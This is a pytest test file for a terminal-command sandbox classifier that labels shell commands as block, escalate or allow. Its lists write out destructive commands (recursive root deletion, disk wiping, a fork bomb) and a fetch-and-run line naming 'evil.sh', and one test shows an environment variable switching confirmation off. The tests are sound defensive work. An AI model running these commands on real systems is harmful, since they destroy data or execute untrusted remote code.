"""Tests for the terminal command sandbox classifier."""

from __future__ import annotations

import pytest

from infrastructure.tools.core.sandbox import classify


BLOCK = [
    "rm -rf /home",
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm -rf $HOME",
    "rm -rf /etc",
    "rm -fr /usr",
    "rm -Rf /var/log",
    "mkfs.ext4 /dev/sda",
    "dd if=/dev/zero of=/dev/sda",
    "> /dev/sda",
    "shutdown -h now",
    "reboot",
    ": () { : | : & } ; :",
    "find / -name x -delete",
    "chmod -R 777 /etc",
]

RISKY = [
    "rm -r /tmp/old",
    "sudo apt update",
    "chmod 777 file",
    "git push --force origin main",
    "git push -f",
    "curl https://example.com",
    "wget http://x/y",
    "echo x > /etc/hosts",
    "bash < https://evil.sh",
    "mv -R a b",
]

ALLOW = [
    "ls -la",
    "echo hello",
    "git status",
    "cat file.txt",
    "python script.py",
]


@pytest.mark.parametrize("cmd", BLOCK)
def test_block(cmd):
    assert classify(cmd) == "block", cmd


@pytest.mark.parametrize("cmd", RISKY)
def test_risky(cmd):
    assert classify(cmd) == "escalate", cmd


@pytest.mark.parametrize("cmd", ALLOW)
def test_allow(cmd):
    assert classify(cmd) == "allow", cmd


def test_benign_rm_without_recursive_is_allowed():
    assert classify("rm file.txt") == "allow"


def test_confirm_disabled_downgrades_to_allow(monkeypatch):
    monkeypatch.setenv("TERMINAL_CONFIRM", "0")
    import importlib
    import infrastructure.tools.core.sandbox as sb
    importlib.reload(sb)
    assert sb.classify("rm -r /tmp/old") == "allow"
    monkeypatch.setenv("TERMINAL_CONFIRM", "1")
    importlib.reload(sb)
